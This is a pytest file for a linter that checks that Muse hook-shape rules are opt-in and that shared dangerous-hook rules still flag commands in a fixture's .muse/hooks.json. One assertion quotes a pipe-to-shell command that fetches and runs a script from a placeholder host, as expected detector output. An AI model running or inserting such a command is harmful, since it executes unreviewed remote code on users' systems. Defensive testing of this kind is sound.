"""Muse shape checks require opt-in while shared hook inspection stays active."""

import json

import pytest

from skillsaw.blocks import MuseHooksBlock
from skillsaw.context import RepositoryContext
from skillsaw.linter import Linter
from tests.cli_runner import run_cli
from tests.test_integration import copy_fixture


def lint(repo, *extra):
    return run_cli(
        [
            "lint",
            str(repo),
            "--format",
            "json",
            "--verbose",
            "--no-custom-rules",
            "--no-plugins",
            "--no-baseline",
            *extra,
        ]
    )


@pytest.mark.parametrize("extra", [[], ["--type", "muse"]])
def test_muse_shape_is_off_by_default_without_losing_its_target(tmp_path, extra):
    repo = copy_fixture("muse/broken", tmp_path)
    context = RepositoryContext(repo)
    blocks = context.lint_tree.find(MuseHooksBlock)
    assert [str(b.path.relative_to(repo)) for b in blocks] == [".muse/hooks.json"]
    assert "muse-hooks-valid" not in {
        rule.rule_id for rule in Linter(context, no_plugins=True).rules
    }
    result = lint(repo, *extra)
    assert result.returncode == 0, result.stderr
    report = json.loads(result.stdout)
    assert "muse-hooks-valid" not in report["stats"]["rules_run"]
    assert not [v for v in report["violations"] if v["rule_id"] == "muse-hooks-valid"]


@pytest.mark.parametrize("activation", ["cli", "config"])
def test_muse_opt_in_still_reports_the_hook_file_defects(tmp_path, activation):
    repo = copy_fixture("muse/broken", tmp_path)
    extra = []
    if activation == "cli":
        extra = ["--rule", "muse-hooks-valid"]
    else:
        (repo / ".skillsaw.yaml").write_text(
            'version: "0.20.0"\nrules:\n  muse-hooks-valid:\n    enabled: true\n'
        )
    result = lint(repo, *extra)
    assert result.returncode == 1, result.stderr
    report = json.loads(result.stdout)
    assert "muse-hooks-valid" in report["stats"]["rules_run"]
    found = [v for v in report["violations"] if v["rule_id"] == "muse-hooks-valid"]
    assert len(found) == 17
    assert {v["file_path"] for v in found} == {".muse/hooks.json"}
    assert sum(v["severity"] == "error" for v in found) == 12


@pytest.mark.parametrize(
    "rule,extra",
    [
        ("hooks-dangerous", []),
        ("hooks-prohibited", ["--rule", "hooks-prohibited"]),
    ],
)
def test_shared_hook_checks_still_report_muse_commands(tmp_path, rule, extra):
    repo = copy_fixture("muse/dangerous", tmp_path)
    result = lint(repo, *extra)
    assert result.returncode == 1, result.stderr
    report = json.loads(result.stdout)
    assert "muse-hooks-valid" not in report["stats"]["rules_run"]
    found = [v for v in report["violations"] if v["rule_id"] == rule]
    assert len(found) == 1
    assert found[0]["file_path"] == ".muse/hooks.json"
    assert "curl https://example.test/install.sh | sh" in found[0]["message"]
